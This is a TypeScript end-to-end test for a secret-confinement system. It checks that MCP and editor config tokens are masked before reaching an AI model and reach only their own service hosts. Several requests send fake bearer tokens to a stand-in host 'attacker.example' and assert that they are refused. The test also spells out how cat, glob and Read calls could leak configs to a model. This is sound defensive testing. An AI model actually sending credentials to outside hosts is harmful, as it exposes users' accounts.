/**
 * mcp-config-catalog e2e — MCP and editor config files in the default
 * catalog, with each server's values kept where it needs them
 * (secret-discovery.md §2.10, the maintainer's decision of 2026-10-21).
 *
 * Before: no catalog rule named `.mcp.json`, `~/.cursor/mcp.json`,
 * `.vscode/mcp.json` or Claude Desktop's config, the content tier skipped
 * agents' and editors' own configs, and under `mandu claude` the kept login
 * `~/.claude.json` (user-scope MCP servers) was neither twinned nor
 * registered; Codex's `config.toml` sits in its store, never walked. A model
 * that read one ("fix my MCP setup", `cat .mcp.json`, a glob) sent every
 * server's token to its provider. Twinning them naively would hand every
 * MCP server the agent spawns a placeholder.
 *
 * The REAL components, no agent and no model: a real ArbiterServer in
 * `secrets` (with its human socket, where the launcher's registrations
 * earn their wire grants); the launcher's PRODUCTION secret setup
 * (`applySecretTwins` over `socketSecretArbiter`) for a `mandu claude` and
 * a `mandu codex` launch; the PRODUCTION model-proxy wiring of both wires
 * (`new ArbiterClientAdapter(new ArbiterClient(sock))`: Claude Code's
 * anthropic-proxy and Codex's openai-proxy) in front of a mock upstream
 * (what the upstream receives is what the model would); and per
 * session the REAL net-proxy the way a launch starts it, its service hosts
 * routed to a counting loopback upstream.
 *
 * Asserted:
 *   1. per launch, the agent's own configs are registered and LEFT READABLE
 *      (Claude Code's `~/.claude.json` and project `.mcp.json` under
 *      claude; Codex's `config.toml` under codex): a stdio server spawned
 *      from the config the agent reads gets the REAL value; every other
 *      config is twinned, and a server spawned from its twin would get a
 *      placeholder;
 *   2. an HTTP server's Authorization credential reaches its own host with
 *      the real value and is refused at any other: the agent's raw header in
 *      its own session (the tripwire, narrowed to the entry's host), and a
 *      twin's placeholder put back by the net-proxy at the host an editor's
 *      HOME config names (a recorded wire grant), refused elsewhere and
 *      outside the Authorization header; a stdio server's own token reaches
 *      its service in the session that runs its agent, and trips in a
 *      session that does not;
 *   3. a model-bound read of every config file (a Read of the raw file, a
 *      command naming it, one that does not, a Read of its twin; Codex's
 *      shell reads on its own wire) carries no byte of any value, only
 *      `$MDU:` placeholders; and after those masked
 *      reads (rows of their own that hold the raw config and outlive the
 *      session), the agent's servers still reach their own services with
 *      their values, and still only there;
 *   4. fail-closed: with the arbiter gone, a Read of the raw config does not
 *      reach the model raw, and the launch's secret setup refuses.
 *
 * Axes explicit: secrets (confidentiality ON, integrity OFF).
 *
 * Mandu-new test (no reference origin).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { createServer, request as httpRequest, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { AnthropicProxy } from "../../interceptors/anthropic-proxy/src/proxy.js";
import { ArbiterClientAdapter } from "../../interceptors/anthropic-proxy/src/arbiter-client.js";
import { MockUpstream, buildTextSse } from "../../interceptors/anthropic-proxy/test/helpers/mock-upstream.js";
import { OpenAiProxy } from "../../interceptors/openai-proxy/src/proxy.js";
import { ArbiterClientAdapter as OpenAiProxyArbiterAdapter } from "../../interceptors/openai-proxy/src/arbiter-client.js";
import { MockUpstream as OpenAiMockUpstream } from "../../interceptors/openai-proxy/test/helpers/mock-upstream.js";
import { applySecretTwins, socketSecretArbiter, SecretConfinementError, type SecretSetupResult } from "../../launcher/src/secret-setup.js";
import { emptyMutation } from "../../launcher/src/backend/types.js";
import { startNetProxy } from "../../launcher/src/services/net-proxy.js";
import { realDeps } from "../../launcher/src/services/primitives.js";
import { Layout } from "../../launcher/src/services/layout.js";
import type { LaunchPlan } from "../../launcher/src/types.js";
import { stateAxes } from "../lib/axes.js";

stateAxes("secrets"); // confidentiality ON, integrity OFF: the default mode

const REPO = resolve(fileURLToPath(new URL("../..", import.meta.url)));

// Every value a credential by its shape; none a real one.
const GH = "ghp_MCPE2EclaudeUserGitHub0123456789abcd";           // ~/.claude.json, stdio env
const LINEAR = "lin_api_MCPE2EclaudeUserLinear9z8y7x6w5v4u";     // ~/.claude.json, HTTP Authorization
const BRAVE = "BSAmcpE2EprojectBraveKey7x9Q2wZ5";                 // .mcp.json, stdio env
const PROJ_AUTH = "pk_MCPE2EprojectHttpBearer0123456789AB";       // .mcp.json, HTTP Authorization
const CODEX_GH = "ghp_MCPE2EcodexInlineGitHub0123456789ef";      // config.toml, inline env
const CODEX_BEARER = "cb_MCPE2EcodexBearerToken0123456789CD";      // config.toml, bearer_token
const CURSOR_AUTH = "cur_MCPE2EcursorHttpBearer0123456789EF";     // ~/.cursor/mcp.json, HTTP Authorization
const CURSOR_ENV = "cev_MCPE2EcursorStdioToken0123456789GH";       // ~/.cursor/mcp.json, stdio env
const VSCODE = "vsc_MCPE2EvscodeServerToken0123456789IJ";          // .vscode/mcp.json
const DESKTOP = "dsk_MCPE2EdesktopServerToken0123456789KL";        // Claude Desktop's config
const ALL = [GH, LINEAR, BRAVE, PROJ_AUTH, CODEX_GH, CODEX_BEARER, CURSOR_AUTH, CURSOR_ENV, VSCODE, DESKTOP];

const HOSTS = ["mcp.linear.app", "api.github.com", "api.search.brave.com", "mcp.project.test", "mcp.codexsrv.test", "mcp.cursor-example.test", "attacker.example"];

const json = (v: unknown): string => `${JSON.stringify(v, null, 2)}\n`;
const FILES: Record<string, string> = {
  "~/.claude.json": json({
    numStartups: 7,
    hasCompletedOnboarding: true,
    mcpServers: {
      github: { command: "npx", args: ["-y", "@modelcontextprotocol/server-github"], env: { GITHUB_PERSONAL_ACCESS_TOKEN: GH } },
      linear: { type: "http", url: "https://mcp.linear.app/mcp", headers: { Authorization: `Bearer ${LINEAR}` } },
    },
  }),
  "ws/.mcp.json": json({
    mcpServers: {
      brave: { command: "npx", args: ["-y", "@brave/brave-search-mcp-server"], env: { BRAVE_API_KEY: BRAVE } },
      project: { type: "http", url: "https://mcp.project.test/mcp", headers: { Authorization: `Bearer ${PROJ_AUTH}` } },
    },
  }),
  "~/.codex/config.toml": [
    'model = "o3"', "",
    "[mcp_servers.github]", 'command = "npx"', 'args = ["-y", "@modelcontextprotocol/server-github"]',
    `env = { GITHUB_PERSONAL_ACCESS_TOKEN = "${CODEX_GH}" }`, "",
    "[mcp_servers.svc]", 'url = "https://mcp.codexsrv.test/mcp"', `bearer_token = "${CODEX_BEARER}"`, "",
  ].join("\n"),
  // Plain-HTTP server URL: the put-back below runs on the net-proxy's plain
  // leg (an https URL's credential is put back over https only).
  "~/.cursor/mcp.json": json({
    mcpServers: {
      remote: { url: "http://mcp.cursor-example.test/mcp", headers: { Authorization: `Bearer ${CURSOR_AUTH}` } },
      local: { command: "uvx", args: ["mcp-local"], env: { LOCAL_API_TOKEN: CURSOR_ENV } },
    },
  }),
  "ws/.vscode/mcp.json": json({ servers: { s: { type: "stdio", command: "node", args: ["s.js"], env: { SERVICE_TOKEN: VSCODE } } }, inputs: [] }),
  "~/.config/Claude/claude_desktop_config.json": json({ mcpServers: { d: { command: "npx", args: ["-y", "d-mcp"], env: { DESKTOP_API_KEY: DESKTOP } } } }),
};

/** Claude Code's Read output: numbered lines. */
const claudeRead = (text: string): string => text.replace(/\n$/, "").split("\n").map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join("\n");

function post(port: number, body: string, session: string): Promise<{ status: number; body: string }> {
  return new Promise((done, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: "/v1/messages", headers: { "content-type": "application/json", "x-mandu-session-id": session } },
      (res) => {
        let buf = "";
        res.setEncoding("utf8");
        res.on("data", (c) => (buf += c));
        res.on("end", () => done({ status: res.statusCode ?? 0, body: buf }));
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

function turn(input: { file_path: string } | { command: string }, content: string, id: string): string {
  return JSON.stringify({
    model: "claude-sonnet-5",
    stream: true,
    messages: [
      { role: "user", content: "fix my MCP setup" },
      { role: "assistant", content: [{ type: "tool_use", id, name: "file_path" in input ? "Read" : "Bash", input }] },
      { role: "user", content: [{ type: "tool_result", tool_use_id: id, content }] },
    ],
  });
}

/** One request through a session's net-proxy (plain HTTP, absolute URL). */
function send(proxyPort: number, url: string, opts: { auth?: string; body?: string }): Promise<{ status: number; body: string }> {
  return new Promise((done, reject) => {
    const u = new URL(url);
    const body = opts.body ?? "";
    const r = httpRequest(
      {
        host: "127.0.0.1", port: proxyPort, method: body ? "POST" : "GET", path: url,
        headers: { host: u.host, "content-type": "application/json", "content-length": Buffer.byteLength(body), ...(opts.auth ? { authorization: opts.auth } : {}) },
      },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => done({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
      },
    );
    r.on("error", reject);
    r.end(body);
  });
}

/** What a stdio MCP server spawned with `env` holds in `name`: its sha256
 *  (the child never prints the value). */
function serverSees(env: Record<string, string>, name: string): string {
  const r = spawnSync(process.execPath, ["-e", `process.stdout.write(require("node:crypto").createHash("sha256").update(process.env[${JSON.stringify(name)}] ?? "").digest("hex"))`], {
    env: { PATH: process.env["PATH"] ?? "", ...env }, encoding: "utf8",
  });
  assert.equal(r.status, 0, r.stderr);
  return r.stdout;
}
const sha = (v: string): string => createHash("sha256").update(v).digest("hex");

test("MCP and editor configs: the agent's own left readable (its servers get the real values), every other twinned, no value at the model, each credential only at its own host, fail-closed", { timeout: 300_000 }, async () => {
  const tmp = realpathSync(mkdtempSync(join(tmpdir(), "mdu-mcp-catalog-")));
  const home = join(tmp, "home");
  const ws = join(tmp, "ws");
  mkdirSync(home, { recursive: true });
  mkdirSync(ws, { recursive: true });
  const at = (rel: string): string => (rel.startsWith("~/") ? join(home, rel.slice(2)) : join(tmp, rel));
  for (const [rel, text] of Object.entries(FILES)) {
    mkdirSync(dirname(at(rel)), { recursive: true });
    writeFileSync(at(rel), text, { mode: 0o600 });
  }
  const P = {
    claudeJson: at("~/.claude.json"), mcpJson: at("ws/.mcp.json"), codexToml: at("~/.codex/config.toml"),
    cursor: at("~/.cursor/mcp.json"), vscode: at("ws/.vscode/mcp.json"), desktop: at("~/.config/Claude/claude_desktop_config.json"),
  };

  // The counting upstream standing in for every service host.
  const seen: string[] = [];
  const upstream: Server = createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => { seen.push(`${(req.headers.host ?? "").replace(/:\d+$/, "")} ${req.headers.authorization ?? ""} ${b}`); res.writeHead(200, { "content-type": "text/plain" }); res.end("ok"); });
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", r));
  const up = (upstream.address() as AddressInfo).port;
  const routes = join(tmp, "routes.yaml");
  writeFileSync(routes, "hosts:\n" + HOSTS.map((h) => `  - host: "${h}"\n    to: "127.0.0.1:${up}"\n`).join(""));

  const sock = join(tmp, "arbiter.sock");
  const humanSock = join(tmp, "human", "h.sock");
  mkdirSync(join(tmp, "human"), { mode: 0o700 });
  const server = new ArbiterServer({
    socketPath: sock, adminSocketPath: join(tmp, "admin.sock"), humanSocketPath: humanSock,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, policyPollMs: 0,
  });
  await server.listen();
  const client = new ArbiterClient(sock);
  await client.connect();

  const cli = (binary: string) => ({ mode: "cli" as const, baseUrl: "https://api.anthropic.com", binary });
  const planFor = (target: string, binary: string, scopeId: string): LaunchPlan => ({
    target, argv: [target], scopeId, tenant: "test", arbiterSock: sock,
    arbiterSockMode: "pinned" as const, arbiterRuntimeBase: tmp, eventDir: join(tmp, "events"), cwd: ws, humanCwd: ws,
    noContextProxy: true, fsSync: false, basePath: "/usr/bin",
    proxy: { host: "127.0.0.1", port: 0 }, openaiProxy: { host: "127.0.0.1", port: 0 }, openaiProviderName: "mandu", noProxyExtra: [],
    requested: { netProxy: true, netProxyMitm: false, execWrap: false }, execWrapCmds: [],
    ullm: cli(binary), noScope: true, writeMcp: true, bestEffort: false, replyFilter: false,
    confidentiality: true, effectiveAxes: { confidentiality: true, integrity: false },
    arbiterHumanSock: humanSock, mockSitesPath: routes,
  } as unknown as LaunchPlan);
  const claudePlan = planFor("claude", "claude", "mcp-catalog-claude");
  const codexPlan = planFor("codex", "codex", "mcp-catalog-codex");

  const saved = { port: process.env["MANDU_NET_PROXY_PORT"], raw: process.env["MANDU_OTHER_AGENT_LOGINS"] };
  delete process.env["MANDU_NET_PROXY_PORT"];
  delete process.env["MANDU_OTHER_AGENT_LOGINS"];
  const stops: Array<() => void> = [];
  const proxies: AnthropicProxy[] = [];
  let n = 0;
  const secretSetup = async (plan: LaunchPlan, arbiterSock = sock, human: string | null = humanSock): Promise<{ res: SecretSetupResult; logs: string[] }> => {
    const runDir = join(tmp, `run-${n++}`);
    mkdirSync(runDir);
    const logs: string[] = [];
    const res = await applySecretTwins(plan, runDir, emptyMutation(), {
      arbiter: socketSecretArbiter(arbiterSock, { humanSock: human, requestTimeoutMs: 5_000 }), commandExists: () => true, usernsOk: () => true, platform: "linux", log: (m) => logs.push(m),
      home, workspaceRoots: [ws], onWsl: false, nestingOk: () => true, wrapBwrap: "bwrap", guardServesTwins: true,
      symlinkProbe: (bwrap) => ({ bwrap, verdict: "unknown" }), env: { MANDU_HOME: join(tmp, "mandu-home") }, makeHome: () => {}, accountHome: null,
    });
    return { res, logs };
  };
  const netProxy = async (plan: LaunchPlan): Promise<number> => {
    const runDir = join(tmp, `np-${n++}`);
    mkdirSync(runDir);
    const r = await startNetProxy(plan, Layout.dev(REPO), runDir, { ...realDeps, home });
    stops.push(r.stop);
    return r.netProxy.port;
  };
  const sessionKey = `mcp-catalog-${process.pid}`;
  const forwarded = async (input: { file_path: string } | { command: string }, content: string): Promise<string> => {
    const mock = new MockUpstream({ sse: buildTextSse("ok") });
    const proxy = new AnthropicProxy({ arbiter: new ArbiterClientAdapter(new ArbiterClient(sock)), upstream: mock.fetcher, sessionKey, log: () => {} });
    proxies.push(proxy);
    const r = await post(await proxy.listen(0), turn(input, content, `tu_${n++}`), sessionKey);
    const b: unknown = mock.requests[mock.requests.length - 1]?.body;
    const sent = b === undefined ? "" : Buffer.isBuffer(b) ? b.toString("utf8") : String(b);
    return `${r.status} ${sent}`;
  };
  const leaked = (text: string): string[] => ALL.filter((v) => text.includes(v));

  try {
    assert.equal((await client.setSessionSpec({ sessionKey, spec: "claude-code", requestedBy: "mcp-config-catalog e2e" })).bound, "claude-code");

    // ── 1. the launch postures ───────────────────────────────────────────
    const claude = await secretSetup(claudePlan);
    const confinedClaude = claude.res.confined.map((c) => c.path).sort();
    assert.deepEqual(confinedClaude, [P.codexToml, P.desktop, P.cursor, P.vscode].sort(), `mandu claude twins every config but its own: ${claude.logs.join("\n")}`);
    for (const own of [P.claudeJson, P.mcpJson]) {
      assert.ok(claude.logs.some((l) => l.includes(own) && /Claude Code's MCP config: left readable to it/.test(l)), `${own} is left readable to Claude Code:\n${claude.logs.join("\n")}`);
    }
    for (const c of claude.res.confined) {
      const twin = c.twin ?? c.symbol;
      assert.deepEqual(leaked(twin), [], `CONFIDENTIALITY: ${c.path}'s twin holds no value:\n${twin}`);
      assert.match(twin, /\$MDU:nomodel_/);
    }
    // The agent reads its own config raw and spawns its stdio servers with
    // what it read: the server holds the REAL value.
    const readEnv = (path: string, server: string): Record<string, string> => (JSON.parse(readFileSync(path, "utf8")) as { mcpServers: Record<string, { env: Record<string, string> }> }).mcpServers[server]!.env;
    assert.equal(serverSees(readEnv(P.mcpJson, "brave"), "BRAVE_API_KEY"), sha(BRAVE), "a stdio server spawned from .mcp.json gets the real value");
    assert.equal(serverSees(readEnv(P.claudeJson, "github"), "GITHUB_PERSONAL_ACCESS_TOKEN"), sha(GH), "a stdio server spawned from ~/.claude.json gets the real value");

    const codex = await secretSetup(codexPlan);
    const confinedCodex = new Map(codex.res.confined.map((c) => [c.path, c.twin ?? c.symbol]));
    assert.ok(!confinedCodex.has(P.codexToml), "mandu codex leaves its own config.toml readable");
    assert.ok(codex.logs.some((l) => l.includes(P.codexToml) && /Codex's MCP config: left readable to it/.test(l)), codex.logs.join("\n"));
    for (const p of [P.claudeJson, P.mcpJson, P.cursor, P.vscode, P.desktop]) assert.ok(confinedCodex.has(p), `mandu codex twins ${p}`);
    // A server spawned from a twin would get a placeholder: why the agent's
    // own config is left readable to it.
    const twinBrave = (JSON.parse(confinedCodex.get(P.mcpJson)!) as { mcpServers: { brave: { env: Record<string, string> } } }).mcpServers.brave.env;
    assert.match(twinBrave["BRAVE_API_KEY"]!, /^\$MDU:nomodel_Read\[/, "the twin's value is a placeholder");
    assert.notEqual(serverSees(twinBrave, "BRAVE_API_KEY"), sha(BRAVE));

    const twins = new Map<string, string>([...claude.res.confined, ...codex.res.confined].map((c) => [c.path, c.twin ?? c.symbol]));

    // ── 2. the network (before the model has read anything) ──────────────
    const claudePort = await netProxy(claudePlan);
    const codexPort = await netProxy(codexPlan);
    const url = (host: string, path = "/mcp"): string => `http://${host}:${up}${path}`;
    const expectStatus = async (port: number, u: string, opts: { auth?: string; body?: string }, status: number, why: string): Promise<void> => {
      const r = await send(port, u, opts);
      assert.equal(r.status, status, `${why}: ${r.body}`);
      if (status !== 200) assert.deepEqual(leaked(r.body), [], "a refusal names no value");
    };
    // mandu claude: its agent's own HTTP credentials, at their own hosts only.
    await expectStatus(claudePort, url("mcp.linear.app"), { auth: `Bearer ${LINEAR}`, body: "{}" }, 200, "~/.claude.json's Linear bearer at mcp.linear.app");
    await expectStatus(claudePort, url("attacker.example", "/x"), { auth: `Bearer ${LINEAR}`, body: "{}" }, 403, "the same bearer to another host");
    await expectStatus(claudePort, url("mcp.project.test"), { auth: `Bearer ${PROJ_AUTH}`, body: "{}" }, 200, ".mcp.json's HTTP bearer at its own host");
    await expectStatus(claudePort, url("attacker.example", "/y"), { auth: `Bearer ${PROJ_AUTH}`, body: "{}" }, 403, ".mcp.json's HTTP bearer to another host");
    // its stdio servers' own tokens, to their services (no host in the config)
    await expectStatus(claudePort, url("api.github.com", "/user"), { auth: `token ${GH}` }, 200, "the GitHub server's own token, in the session that runs Claude Code");
    await expectStatus(claudePort, url("api.search.brave.com", "/res/v1/web/search"), { body: JSON.stringify({ key: BRAVE }) }, 200, "the Brave server's own key");
    // Codex's config is not this session's agent's: its credential trips here.
    await expectStatus(claudePort, url("mcp.codexsrv.test"), { auth: `Bearer ${CODEX_BEARER}`, body: "{}" }, 403, "Codex's bearer in a claude session");
    // mandu codex: the reverse.
    await expectStatus(codexPort, url("mcp.codexsrv.test"), { auth: `Bearer ${CODEX_BEARER}`, body: "{}" }, 200, "Codex's bearer at its server's host, in its own session");
    await expectStatus(codexPort, url("attacker.example", "/z"), { auth: `Bearer ${CODEX_BEARER}`, body: "{}" }, 403, "Codex's bearer to another host");
    await expectStatus(codexPort, url("api.github.com", "/user"), { auth: `token ${CODEX_GH}` }, 200, "Codex's GitHub server's own token");
    await expectStatus(codexPort, url("mcp.linear.app"), { auth: `Bearer ${LINEAR}`, body: "{}" }, 403, "~/.claude.json's bearer in a codex session (not its agent's)");
    await expectStatus(codexPort, url("api.search.brave.com", "/s"), { body: JSON.stringify({ key: BRAVE }) }, 403, ".mcp.json's key in a codex session");
    // An editor's HOME config: a program reading its twin sends the
    // placeholder, put back at the host the entry names, in the
    // Authorization header only, and nowhere else.
    const cursorTwin = JSON.parse(twins.get(P.cursor)!) as { mcpServers: { remote: { headers: { Authorization: string } } } };
    const placeholder = cursorTwin.mcpServers.remote.headers.Authorization;
    assert.match(placeholder, /^\$MDU:nomodel_Read\[/, "the twin holds the Authorization credential's placeholder");
    const before = seen.length;
    await expectStatus(claudePort, url("mcp.cursor-example.test"), { auth: placeholder, body: "{}" }, 200, "the placeholder at its own host");
    assert.ok(seen.slice(before).some((s) => s.startsWith("mcp.cursor-example.test ") && s.includes(`Bearer ${CURSOR_AUTH}`)), `the host received the real credential: ${seen.slice(before).join("\n")}`);
    await expectStatus(claudePort, url("attacker.example", "/w"), { auth: placeholder, body: "{}" }, 403, "the placeholder to another host");
    await expectStatus(claudePort, url("mcp.cursor-example.test", "/publish"), { body: JSON.stringify({ note: placeholder }) }, 403, "the placeholder in the body of a request to its own host");

    // ── 3. what reaches the model ────────────────────────────────────────
    const cmdName = (p: string): string => p.startsWith(ws) ? `.${p.slice(ws.length)}` : `~${p.slice(home.length)}`;
    for (const [name, path] of Object.entries(P)) {
      const raw = readFileSync(path, "utf8");
      const globbed = path.endsWith(".toml") ? "cat ~/.c*/c*.t*" : path.includes(".vscode") ? "cat ./.v*/m*" : path.includes("Claude/") ? "cat ~/.config/C*/*" : "cat ./.m* ~/.c*.j* ~/.cu*/*";
      for (const [input, content] of [
        [{ file_path: path }, claudeRead(raw)],
        [{ command: `cat ${cmdName(path)}` }, raw],
        [{ command: globbed }, raw],
        ...(twins.has(path) ? [[{ file_path: path }, claudeRead(twins.get(path)!)] as const] : []),
      ] as const) {
        const sent = await forwarded(input, content);
        assert.deepEqual(leaked(sent), [], `CONFIDENTIALITY VIOLATION: ${name} reached the model through ${JSON.stringify(input)}:\n${sent.slice(0, 2500)}`);
        assert.match(sent, /\$MDU:nomodel_/, `${name}: the model sees a placeholder through ${JSON.stringify(input)}`);
      }
    }
    // Codex's wire (the openai-proxy, its production adapter): a shell read
    // of Codex's own config and of the others.
    const codexSession = `mcp-catalog-codex-${process.pid}`;
    const oaUp = new OpenAiMockUpstream({ sse: "event: response.completed\ndata: {}\n\n" });
    const oaClient = new ArbiterClient(sock);
    await oaClient.connect();
    const oaProxy = new OpenAiProxy({ arbiter: new OpenAiProxyArbiterAdapter(oaClient), upstream: (a) => oaUp.fetcher(a), sessionKey: codexSession, log: () => {} });
    const oaPort = await oaProxy.listen(0);
    const codexHead = "Chunk ID: 5e1f\nWall time: 0.0123 seconds\nProcess exited with code 0\nOriginal token count: 30\nOutput:\n";
    try {
      for (const [cmd, path] of [
        ["cat ~/.codex/config.toml", P.codexToml], ["sed -n 1,40p ~/.c*/c*.t*", P.codexToml],
        ["cat .mcp.json", P.mcpJson], ["cat ~/.claude.json", P.claudeJson], ["python3 -c 'print(open(\"x\").read())'", P.cursor],
      ] as const) {
        const id = `c_${n++}`;
        const res = await fetch(`http://127.0.0.1:${oaPort}/v1/responses`, {
          method: "POST", headers: { "content-type": "application/json", "x-mandu-session-id": codexSession },
          body: JSON.stringify({ model: "gpt-5.5", stream: true, instructions: "You are Codex.", input: [
            { type: "message", role: "user", content: [{ type: "input_text", text: "fix my MCP setup" }] },
            { type: "function_call", call_id: id, name: "exec_command", arguments: JSON.stringify({ cmd, workdir: ws }) },
            { type: "function_call_output", call_id: id, output: `${codexHead}${readFileSync(path, "utf8")}` },
          ] }),
        });
        const status = res.status;
        await res.text();
        const sent = oaUp.requests.at(-1)?.bodyText ?? "";
        assert.equal(status, 200);
        assert.deepEqual(leaked(sent), [], `CONFIDENTIALITY VIOLATION: ${path} reached Codex's model through \`${cmd}\`:\n${sent.slice(0, 2500)}`);
        assert.match(sent, /\$MDU:nomodel_/, `the model sees a placeholder for \`${cmd}\``);
      }
    } finally {
      await oaProxy.close();
      oaClient.close();
    }
    for (const v of ALL) assert.ok((await client.scanSecretValues(`printed: ${v}`)).hits.length > 0, `the value backstop knows ${v.slice(0, 8)}…`);
    // The masked reads above are rows of their own, holding the raw config,
    // and outlive this session: the agent's own servers still reach their
    // services with their values, and still only there.
    await expectStatus(claudePort, url("api.github.com", "/user"), { auth: `token ${GH}` }, 200, "after the model read ~/.claude.json, the GitHub server's own token");
    await expectStatus(claudePort, url("api.search.brave.com", "/res/v1/web/search"), { body: JSON.stringify({ key: BRAVE }) }, 200, "after the model read .mcp.json, the Brave server's own key");
    await expectStatus(claudePort, url("mcp.linear.app"), { auth: `Bearer ${LINEAR}`, body: "{}" }, 200, "and the Linear bearer at its own host");
    await expectStatus(claudePort, url("attacker.example", "/v"), { auth: `Bearer ${LINEAR}`, body: "{}" }, 403, "but not at another");
    await expectStatus(codexPort, url("api.github.com", "/user"), { auth: `token ${GH}` }, 403, "a codex session is still refused Claude Code's server's token");

    // THE ORACLE: no request to the attacker host reached it, and no refused
    // request reached any host.
    assert.ok(!seen.some((s) => s.startsWith("attacker.example ")), seen.join("\n"));
    const reached = seen.map((s) => s.split(" ")[0]);
    assert.deepEqual(reached, [
      "mcp.linear.app", "mcp.project.test", "api.github.com", "api.search.brave.com", "mcp.codexsrv.test", "api.github.com", "mcp.cursor-example.test",
      "api.github.com", "api.search.brave.com", "mcp.linear.app",
    ], seen.join("\n"));

    // ── 4. fail-closed: the arbiter gone ─────────────────────────────────
    for (const s of stops.splice(0)) s();
    client.close();
    await server.close();
    const gone = await forwarded({ file_path: P.mcpJson }, claudeRead(readFileSync(P.mcpJson, "utf8")));
    assert.deepEqual(leaked(gone), [], `CONFIDENTIALITY VIOLATION: with the arbiter gone, .mcp.json reached the model raw:\n${gone.slice(0, 1500)}`);
    await assert.rejects(secretSetup(claudePlan), SecretConfinementError, "the launch refuses when the arbiter cannot register the configs");
  } finally {
    for (const s of stops) s();
    for (const p of proxies) await p.close().catch(() => {});
    if (saved.port === undefined) delete process.env["MANDU_NET_PROXY_PORT"]; else process.env["MANDU_NET_PROXY_PORT"] = saved.port;
    if (saved.raw === undefined) delete process.env["MANDU_OTHER_AGENT_LOGINS"]; else process.env["MANDU_OTHER_AGENT_LOGINS"] = saved.raw;
    client.close();
    await server.close().catch(() => {});
    upstream.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
